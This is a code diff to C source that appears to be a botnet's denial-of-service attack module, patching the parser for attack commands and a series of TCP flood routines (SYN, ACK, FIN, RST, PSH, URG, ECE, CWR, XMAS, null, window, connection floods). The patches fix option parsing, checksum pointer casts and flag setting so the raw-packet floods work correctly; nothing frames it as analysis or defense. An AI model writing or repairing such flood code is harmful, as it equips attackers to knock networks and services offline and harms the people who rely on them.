@@ -75,11 +75,14 @@ void attack_parse(char *buf, int len) {
         targs[i].netmask = 32;
     }
 
-    uint8_t opts_len = buf[2 + (targs_len * 4)];
+    uint8_t opts_offset = 2 + (targs_len * 4) + 1;
+    uint8_t opts_len = buf[opts_offset - 1];
     struct attack_option opts[ATTACK_MAX_OPTIONS];
     for (int i = 0; i < opts_len; i++) {
-        opts[i].key = buf[3 + (targs_len * 4) + (i * 2)];
-        opts[i].val = (char *)&buf[3 + (targs_len * 4) + (i * 2) + 1];
+        opts[i].key = buf[opts_offset];
+        uint8_t vlen = buf[opts_offset + 1];
+        opts[i].val = (char *)&buf[opts_offset + 2];
+        opts_offset += 2 + vlen;
     }
 
     attack_start(-1, attack_id, targs_len, targs, opts);
@@ -750,7 +753,7 @@ void attack_syn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
             tcph->seq = rand_next();
             tcph->ack_seq = 0;
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -796,7 +799,7 @@ void attack_ack_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -842,7 +845,7 @@ void attack_fin_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -887,7 +890,7 @@ void attack_rst_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
             tcph->source = rand_next();
             tcph->seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -933,7 +936,7 @@ void attack_psh_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -979,7 +982,7 @@ void attack_urg_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -1006,7 +1009,7 @@ void attack_ece_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
     iph->protocol = IPPROTO_TCP;
 
     tcph->dest = htons(dport);
-    tcph->ece = TRUE;
+    ((uint8_t *)tcph)[13] |= 0x40; /* ECE */
     tcph->doff = 5;
     tcph->window = rand_next();
 
@@ -1025,7 +1028,7 @@ void attack_ece_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -1052,7 +1055,7 @@ void attack_cwr_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
     iph->protocol = IPPROTO_TCP;
 
     tcph->dest = htons(dport);
-    tcph->cwr = TRUE;
+    ((uint8_t *)tcph)[13] |= 0x80; /* CWR */
     tcph->doff = 5;
     tcph->window = rand_next();
 
@@ -1071,7 +1074,7 @@ void attack_cwr_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -1122,7 +1125,7 @@ void attack_tcpconn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_targ
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -1173,7 +1176,7 @@ void attack_xmas_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target 
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -1219,7 +1222,7 @@ void attack_null_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target 
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
@@ -1265,7 +1268,7 @@ void attack_window_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_targe
             tcph->seq = rand_next();
             tcph->ack_seq = rand_next();
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
+            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
             sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin));
         }
